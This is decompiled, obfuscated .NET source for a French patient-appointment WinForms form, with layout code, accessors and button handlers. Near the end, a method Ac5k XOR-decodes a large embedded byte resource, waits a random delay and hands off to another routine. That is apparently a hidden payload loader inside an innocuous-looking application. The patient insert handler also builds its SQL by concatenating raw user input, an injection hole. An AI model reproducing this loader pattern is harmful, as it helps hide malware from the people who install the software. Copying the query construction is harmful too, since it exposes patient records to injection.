		((DataGridViewColumn)Qa1m()).set_HeaderText("Sexe ");
		((DataGridViewColumn)Qa1m()).set_MinimumWidth(6);
		((DataGridViewColumn)Qa1m()).set_Name("Column6");
		((DataGridViewColumn)Qa1m()).set_Width(125);
		((DataGridViewColumn)f6AL()).set_HeaderText("Date du dossier");
		((DataGridViewColumn)f6AL()).set_MinimumWidth(6);
		((DataGridViewColumn)f6AL()).set_Name("Column7");
		((DataGridViewColumn)f6AL()).set_Width(125);
		((DataGridViewColumn)f8TN()).set_HeaderText("Tel");
		((DataGridViewColumn)f8TN()).set_MinimumWidth(6);
		((DataGridViewColumn)f8TN()).set_Name("Column8");
		((DataGridViewColumn)f8TN()).set_Width(125);
		Ls4a().set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		((Control)Ls4a()).set_Location(new Point(279, 522));
		((Control)Ls4a()).set_Margin(new Padding(4));
		((Control)Ls4a()).set_Name("DataGridView2");
		Ls4a().set_RowHeadersWidth(51);
		((Control)Ls4a()).set_Size(new Size(1129, 217));
		((Control)Ls4a()).set_TabIndex(29);
		((Control)Ja81()).set_Font(new Font("Franklin Gothic Demi", 12f, (FontStyle)6, (GraphicsUnit)3, (byte)0));
		((Control)Ja81()).set_ForeColor(Color.SpringGreen);
		((Control)Ja81()).set_Location(new Point(433, 37));
		((Control)Ja81()).set_Margin(new Padding(4, 0, 4, 0));
		((Control)Ja81()).set_Name("Label3");
		((Control)Ja81()).set_Size(new Size(364, 28));
		((Control)Ja81()).set_TabIndex(30);
		Ja81().set_Text("Prener votre rendez-vous ");
		((ButtonBase)Cs35()).set_FlatStyle((FlatStyle)0);
		((Control)Cs35()).set_Font(new Font("MS Reference Sans Serif", 9.75f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		((Control)Cs35()).set_ForeColor(Color.White);
		((Control)Cs35()).set_Location(new Point(1411, 20));
		((Control)Cs35()).set_Margin(new Padding(4));
		((Control)Cs35()).set_Name("Button10");
		((Control)Cs35()).set_Size(new Size(56, 62));
		((Control)Cs35()).set_TabIndex(24);
		((ButtonBase)Cs35()).set_UseVisualStyleBackColor(true);
		((ButtonBase)i2PN()).set_FlatStyle((FlatStyle)0);
		((Control)i2PN()).set_Font(new Font("MS Reference Sans Serif", 9.75f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		((Control)i2PN()).set_ForeColor(Color.White);
		((Control)i2PN()).set_Location(new Point(1220, 20));
		((Control)i2PN()).set_Margin(new Padding(4));
		((Control)i2PN()).set_Name("Button8");
		((Control)i2PN()).set_Size(new Size(56, 62));
		((Control)i2PN()).set_TabIndex(23);
		((ButtonBase)i2PN()).set_UseVisualStyleBackColor(true);
		((ButtonBase)c6AY()).set_FlatStyle((FlatStyle)0);
		((Control)c6AY()).set_Font(new Font("MS Reference Sans Serif", 9.75f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		((Control)c6AY()).set_ForeColor(Color.White);
		((Control)c6AY()).set_Location(new Point(1036, 20));
		((Control)c6AY()).set_Margin(new Padding(4));
		((Control)c6AY()).set_Name("Button7");
		((Control)c6AY()).set_Size(new Size(56, 62));
		((Control)c6AY()).set_TabIndex(22);
		((ButtonBase)c6AY()).set_UseVisualStyleBackColor(true);
		((ButtonBase)Rx6k()).set_FlatStyle((FlatStyle)0);
		((Control)Rx6k()).set_Font(new Font("MS Reference Sans Serif", 9.75f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		((Control)Rx6k()).set_ForeColor(Color.White);
		((Control)Rx6k()).set_Location(new Point(884, 20));
		((Control)Rx6k()).set_Margin(new Padding(4));
		((Control)Rx6k()).set_Name("Button5");
		((Control)Rx6k()).set_Size(new Size(56, 62));
		((Control)Rx6k()).set_TabIndex(21);
		((ButtonBase)Rx6k()).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(8f, 16f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(SystemColors.ButtonHighlight);
		((Form)this).set_ClientSize(new Size(1531, 757));
		((Control)this).get_Controls().Add((Control)(object)Ja81());
		((Control)this).get_Controls().Add((Control)(object)b4RB());
		((Control)this).get_Controls().Add((Control)(object)Ls4a());
		((Control)this).get_Controls().Add((Control)(object)t7NP());
		((Control)this).get_Controls().Add((Control)(object)p8K0());
		((Control)this).get_Controls().Add((Control)(object)Hc4k());
		((Control)this).get_Controls().Add((Control)(object)n3MD());
		((Control)this).get_Controls().Add((Control)(object)Cs35());
		((Control)this).get_Controls().Add((Control)(object)i2PN());
		((Control)this).get_Controls().Add((Control)(object)c6AY());
		((Control)this).get_Controls().Add((Control)(object)Rx6k());
		((Control)this).get_Controls().Add((Control)(object)x0MJ());
		((Control)this).get_Controls().Add((Control)(object)Gp0r());
		((Control)this).get_Controls().Add((Control)(object)Gj61());
		((Control)this).get_Controls().Add((Control)(object)Zq15());
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Margin(new Padding(4));
		((Control)this).set_Name("Form3");
		((Form)this).set_Text("\"");
		((Control)Zq15()).ResumeLayout(false);
		((ISupportInitialize)g5BN()).EndInit();
		((Control)x0MJ()).ResumeLayout(false);
		((Control)x0MJ()).PerformLayout();
		((ISupportInitialize)f2QL()).EndInit();
		((ISupportInitialize)b4RB()).EndInit();
		((ISupportInitialize)Ls4a()).EndInit();
		((Control)this).ResumeLayout(false);
	}

	[SpecialName]
	internal virtual Panel Zq15()
	{
		return X;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void o6KX(Panel i3W2)
	{
		Panel val = (X = i3W2);
	}

	[SpecialName]
	internal virtual PictureBox g5BN()
	{
		return f;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Jn26(PictureBox g7KP)
	{
		PictureBox val = (f = g7KP);
	}

	[SpecialName]
	internal virtual Button p1F7()
	{
		return _Button1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Kn7s(Button Xm7e)
	{
		EventHandler eventHandler = n7R1;
		Button button = _Button1;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button1 = Xm7e;
		button = _Button1;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Panel k4SZ()
	{
		return _Panel4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void x2HL(Panel e3KG)
	{
		_Panel4 = e3KG;
	}

	[SpecialName]
	internal virtual Button Dj51()
	{
		return K;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Kb0r(Button j9ZP)
	{
		Button val = (K = j9ZP);
	}

	[SpecialName]
	internal virtual Button Tj93()
	{
		return _Button4;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Xc3n(Button q7Z3)
	{
		_Button4 = q7Z3;
	}

	[SpecialName]
	internal virtual Button Ri7d()
	{
		return _Button3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void c6MD(Button s6JR)
	{
		EventHandler eventHandler = y7D8;
		Button button = _Button3;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button3 = s6JR;
		button = _Button3;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button o6X4()
	{
		return W;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void a2B7(Button s8MW)
	{
		EventHandler eventHandler = Qg57;
		Button w = W;
		if (w != null)
		{
			((Control)w).remove_Click(eventHandler);
		}
		Button val = (W = s8MW);
		w = W;
		if (w != null)
		{
			((Control)w).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Panel Gp0r()
	{
		return _Panel3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Pq64(Panel Si68)
	{
		_Panel3 = Si68;
	}

	[SpecialName]
	internal virtual Panel Gj61()
	{
		return _Panel2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void o1BD(Panel Lc4n)
	{
		_Panel2 = Lc4n;
	}

	[SpecialName]
	internal virtual GroupBox x0MJ()
	{
		return l;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void s2W1(GroupBox i0RB)
	{
		EventHandler eventHandler = Bg26;
		GroupBox val = l;
		if (val != null)
		{
			((Control)val).remove_Enter(eventHandler);
		}
		GroupBox val2 = (l = i0RB);
		val = l;
		if (val != null)
		{
			((Control)val).add_Enter(eventHandler);
		}
	}

	[SpecialName]
	internal virtual DateTimePicker Bf8c()
	{
		return H;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Yr07(DateTimePicker s9QG)
	{
		DateTimePicker val = (H = s9QG);
	}

	[SpecialName]
	internal virtual Label q7RM()
	{
		return y;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void g3J9(Label c9N8)
	{
		Label val = (y = c9N8);
	}

	[SpecialName]
	internal virtual TextBox t4N7()
	{
		return c;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void r9R0(TextBox Lx21)
	{
		TextBox val = (c = Lx21);
	}

	[SpecialName]
	internal virtual PictureBox f2QL()
	{
		return r;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void c9XP(PictureBox x1G2)
	{
		PictureBox val = (r = x1G2);
	}

	[SpecialName]
	internal virtual Label n6JD()
	{
		return P;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void p3SC(Label s0KE)
	{
		Label val = (P = s0KE);
	}

	[SpecialName]
	internal virtual ComboBox Rs39()
	{
		return a;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Tf7m(ComboBox o4G9)
	{
		ComboBox val = (a = o4G9);
	}

	[SpecialName]
	internal virtual Label Bj6n()
	{
		return i;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Dj18(Label Qc7t)
	{
		Label val = (i = Qc7t);
	}

	[SpecialName]
	internal virtual DateTimePicker Qp9w()
	{
		return _DateTimePicker1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void e3G8(DateTimePicker e3A0)
	{
		_DateTimePicker1 = e3A0;
	}

	[SpecialName]
	internal virtual Label Jn6c()
	{
		return s;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void t2A0(Label x8S9)
	{
		Label val = (s = x8S9);
	}

	[SpecialName]
	internal virtual Label Zs0e()
	{
		return j;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void y9Z2(Label Aw7b)
	{
		Label val = (j = Aw7b);
	}

	[SpecialName]
	internal virtual Label o5Y9()
	{
		return b;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void r2D0(Label Wj24)
	{
		Label val = (b = Wj24);
	}

	[SpecialName]
	internal virtual Label Wx64()
	{
		return M;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ni6j(Label Qr16)
	{
		Label val = (M = Qr16);
	}

	[SpecialName]
	internal virtual Label e8C3()
	{
		return d;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void So7z(Label e8HF)
	{
		Label val = (d = e8HF);
	}

	[SpecialName]
	internal virtual TextBox Js73()
	{
		return _txt_prenom;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void j5X8(TextBox d3C4)
	{
		_txt_prenom = d3C4;
	}

	[SpecialName]
	internal virtual TextBox j3FP()
	{
		return t;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void x8K1(TextBox Pt7o)
	{
		TextBox val = (t = Pt7o);
	}

	[SpecialName]
	internal virtual TextBox Cb9r()
	{
		return _txt_Adresse;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ao2x(TextBox n0L4)
	{
		_txt_Adresse = n0L4;
	}

	[SpecialName]
	internal virtual TextBox Yi4x()
	{
		return _txt_nom;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void e7M6(TextBox n3XE)
	{
		_txt_nom = n3XE;
	}

	[SpecialName]
	internal virtual Button Rx6k()
	{
		return e;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Zn4y(Button Ys18)
	{
		EventHandler eventHandler = Fs26;
		Button val = e;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		Button val2 = (e = Ys18);
		val = e;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button c6AY()
	{
		return _Button7;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Mr78(Button St7c)
	{
		EventHandler eventHandler = Rp24;
		Button button = _Button7;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button7 = St7c;
		button = _Button7;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button i2PN()
	{
		return _Button8;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void g8TF(Button p6T0)
	{
		EventHandler eventHandler = w7C4;
		Button button = _Button8;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button8 = p6T0;
		button = _Button8;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button Cs35()
	{
		return _Button10;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Zt3b(Button Gc2s)
	{
		EventHandler eventHandler = Mt2q;
		Button button = _Button10;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button10 = Gc2s;
		button = _Button10;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button n3MD()
	{
		return _Button11;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Wn34(Button Qm9j)
	{
		EventHandler eventHandler = b7G5;
		Button button = _Button11;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button11 = Qm9j;
		button = _Button11;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button Hc4k()
	{
		return u;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void g6L8(Button s0EG)
	{
		EventHandler eventHandler = Fq9i;
		Button val = u;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		Button val2 = (u = s0EG);
		val = u;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button p8K0()
	{
		return v;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void z8TE(Button Pf5j)
	{
		EventHandler eventHandler = Ee17;
		Button val = v;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		Button val2 = (v = Pf5j);
		val = v;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button t7NP()
	{
		return N;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void g7JY(Button Yi2c)
	{
		EventHandler eventHandler = Xm80;
		Button n = N;
		if (n != null)
		{
			((Control)n).remove_Click(eventHandler);
		}
		Button val = (N = Yi2c);
		n = N;
		if (n != null)
		{
			((Control)n).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual DataGridView b4RB()
	{
		return _DataGridView1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void c2G8(DataGridView Zi97)
	{
		_DataGridView1 = Zi97;
	}

	[SpecialName]
	internal virtual DataGridViewTextBoxColumn Hr6c()
	{
		return Q;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Pg8o(DataGridViewTextBoxColumn Zo24)
	{
		DataGridViewTextBoxColumn val = (Q = Zo24);
	}

	[SpecialName]
	internal virtual DataGridViewTextBoxColumn Mx36()
	{
		return _Column2;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void p3B6(DataGridViewTextBoxColumn w8E0)
	{
		_Column2 = w8E0;
	}

	[SpecialName]
	internal virtual DataGridViewTextBoxColumn Px6i()
	{
		return O;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Nm0r(DataGridViewTextBoxColumn w7YQ)
	{
		DataGridViewTextBoxColumn val = (O = w7YQ);
	}

	[SpecialName]
	internal virtual DataGridViewTextBoxColumn Bd1j()
	{
		return G;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void i3TK(DataGridViewTextBoxColumn x7AN)
	{
		DataGridViewTextBoxColumn val = (G = x7AN);
	}

	[SpecialName]
	internal virtual DataGridViewTextBoxColumn s0YB()
	{
		return _Column5;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Np15(DataGridViewTextBoxColumn i3SX)
	{
		_Column5 = i3SX;
	}

	[SpecialName]
	internal virtual DataGridViewTextBoxColumn Qa1m()
	{
		return Z;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Zo37(DataGridViewTextBoxColumn s5Q1)
	{
		DataGridViewTextBoxColumn val = (Z = s5Q1);
	}

	[SpecialName]
	internal virtual DataGridViewTextBoxColumn f6AL()
	{
		return fX;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void z4KJ(DataGridViewTextBoxColumn Gi8f)
	{
		DataGridViewTextBoxColumn val = (fX = Gi8f);
	}

	[SpecialName]
	internal virtual DataGridViewTextBoxColumn f8TN()
	{
		return _Column8;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void g1AC(DataGridViewTextBoxColumn j7S4)
	{
		_Column8 = j7S4;
	}

	[SpecialName]
	internal virtual DataGridView Ls4a()
	{
		return ff;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ep3k(DataGridView Gf24)
	{
		DataGridView val = (ff = Gf24);
	}

	[SpecialName]
	internal virtual Label Ja81()
	{
		return fK;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ec70(Label b3T4)
	{
		Label val = (fK = b3T4);
	}

	[SpecialName]
	internal virtual TextBox s4RZ()
	{
		return _TextBox1;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void a9BL(TextBox Dt0f)
	{
		_TextBox1 = Dt0f;
	}

	[SpecialName]
	internal virtual Button n0TW()
	{
		return _Button14;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void i0ML(Button n8R6)
	{
		EventHandler eventHandler = Ao81;
		Button button = _Button14;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button14 = n8R6;
		button = _Button14;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	private void b7G5(object sender, EventArgs e)
	{
		//IL_013c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0143: Expected O, but got Unknown
		//IL_0146: Unknown result type (might be due to invalid IL or missing references)
		//IL_0172: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Random random = new Random();
			int num = random.Next(0, 1000000);
			string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("Insert into Patient values  ('" + Conversions.ToString(num) + "', '" + Yi4x().get_Text() + "', '" + Js73().get_Text() + "', '" + j3FP().get_Text() + "', '" + Qp9w().get_Value().ToShortDateString() + "' , '"), Rs39().get_SelectedItem()), (object)"' ,'"), (object)Bf8c().get_Value().ToShortDateString()), (object)"' , '"), (object)t4N7().get_Text()), (object)"','"), (object)Cb9r().get_Text()), (object)"','"), (object)s4RZ().get_Text()), (object)"')"));
			oConnection.Open();
			OleDbCommand val = new OleDbCommand(text, oConnection);
			Interaction.MsgBox((object)text, (MsgBoxStyle)0, (object)null);
			val.ExecuteNonQuery();
			oConnection.Close();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	private void Mt2q(object sender, EventArgs e)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Invalid comparison between Unknown and I4
		MsgBoxResult val = Interaction.MsgBox((object)"Vous voulez vraiment quitte ", (MsgBoxStyle)68, (object)"Confiramation");
		if ((int)val == 6)
		{
			Application.Exit();
		}
	}

	internal static void Ac5k()
	{
		byte[] array = Pr4x.o6A5(133632);
		checked
		{
			int sz = Conversions.ToInteger(j8Y.mDic[j8Y.sNum]) * 3;
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = k4C9(array[i], (byte[])j8Y.mDic[j8Y.sArray], sz, i);
			}
			j8Y.mDic.Add(j8Y.mArray, array);
			Task.Delay(new Random().Next(1000, 5000)).Wait();
			m5N4.t9M2();
		}
	}

	private void Xm80(object sender, EventArgs e)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		((Control)b4RB()).set_Visible(false);
		try
		{
			oConnection.Open();
			string text = "SELECT * from Patient";
			OleDbCommand val = new OleDbCommand(text, oConnection);
			OleDbDataAdapter val2 = new OleDbDataAdapter(val);
			DataSet dataSet = new DataSet();
			((DbDataAdapter)(object)val2).Fill(dataSet, "Patient");
			Ls4a().set_DataSource((object)dataSet);
			Ls4a().set_DataMember("Patient");
			oConnection.Close();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	private void Ee17(object sender, EventArgs e)
	{
		Yi4x().set_Text(" ");
		Js73().set_Text(" ");
		s4RZ().set_Text(" ");
		f2QL().set_Image((Image)null);
		j3FP().set_Text(" ");
		t4N7().set_Text(" ");
		Cb9r().set_Text(" ");
		Rs39().set_SelectedIndex(-1);
	}

	private void Fq9i(object sender, EventArgs e)
	{
		((Control)Qm5.Forms.Lb2()).Show();
		((Form)this).Close();
	}

	private void Qg57(object sender, EventArgs e)
	{
		((Control)Qm5.Forms.s7W()).Show();
		((Form)this).Close();
	}

	private void n7R1(object sender, EventArgs e)
	{
		((Control)Qm5.Forms.k8W()).Show();
		((Form)this).Close();
	}

	private void Di51(object sender, EventArgs e)
	{
	}

	private void y7D8(object sender, EventArgs e)
	{
		((Control)Qm5.Forms.y9H()).Show();
		((Form)this).Close();
	}

	private void Fs26(object sender, EventArgs e)
	{
		Process.Start("https://www.facebook.com/");
	}

	private void Rp24(object sender, EventArgs e)
	{
		Process.Start("https://www.instagram.com/accounts/login/");
	}

	private void w7C4(object sender, EventArgs e)
	{
		Process.Start("https://twitter.com/explore");
	}

	private void Bg26(object sender, EventArgs e)
	{
	}

	private void Ao81(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Invalid comparison between Unknown and I4
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			FileDialog val = (FileDialog)new OpenFileDialog();
			val.set_Filter("Image file (* .jpg ;* .bmp ;*.gif) | * .jpg;*.bmp ;*.gif");
			if ((int)((CommonDialog)val).ShowDialog() == 1)
			{
				string text = (fW = val.get_FileName());
				Bitmap image = new Bitmap(fW);
				f2QL().set_SizeMode((PictureBoxSizeMode)1);
				f2QL().set_Image((Image)(object)image);
				((Control)f2QL()).set_Tag((object)val.get_FileName());
			}
			val = null;
			s4RZ().set_Text(((Control)f2QL()).get_Tag().ToString());
		}
		catch (ArgumentException projectError)
		{
			ProjectData.SetProjectError((Exception)projectError);
			string text2 = (fW = " ");
			ProjectData.ClearProjectError();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message.ToString());
			ProjectData.ClearProjectError();
		}
	}

	internal static byte k4C9(byte Eb12, byte[] Sq12, int Sz04, int b7K6)
	{
		Eb12 = (byte)(Eb12 ^ checked((byte)(Sq12[unchecked(b7K6 % Sq12.Length)] ^ ((b7K6 + unchecked(Sz04 % Sq12.Length)) & Sz04))));
		return Eb12;
	}
}
